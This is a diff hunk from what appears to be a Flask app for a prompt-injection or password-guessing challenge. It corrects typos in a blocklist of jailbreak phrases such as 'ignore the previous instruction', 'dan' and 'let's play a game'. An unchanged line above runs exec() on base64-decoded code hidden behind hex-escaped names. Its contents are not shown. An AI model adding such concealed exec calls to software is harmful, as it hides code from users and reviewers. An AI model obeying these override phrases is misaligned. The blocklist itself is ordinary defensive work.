@@ -150,7 +150,7 @@ __NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__N
 exec(__import__("\x62\x61\x73\x65\x36\x34").b64decode(__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO.encode("\x75\x74\x66\x2d\x38")).decode("\x75\x74\x66\x2d\x38"))
 
 
-forbidden_words = ["password", "disregard the previous instruction", "forget the previous instruction", "dan", "ignore the previous insutrction", "ignore the instruction", "let's play a game", "initial instruction", "initial instructions", "disregard the previous instructions", "forget the previous instructions", "ignore the previous insutrction"]
+forbidden_words = ["password", "disregard the previous instruction", "forget the previous instruction", "dan", "ignore the previous instruction", "ignore the instruction", "let's play a game", "initial instruction", "initial instructions", "disregard the previous instructions", "forget the previous instructions", "ignore the previous instructions"]
 db = SQLAlchemy()
 
 app = Flask(__name__)
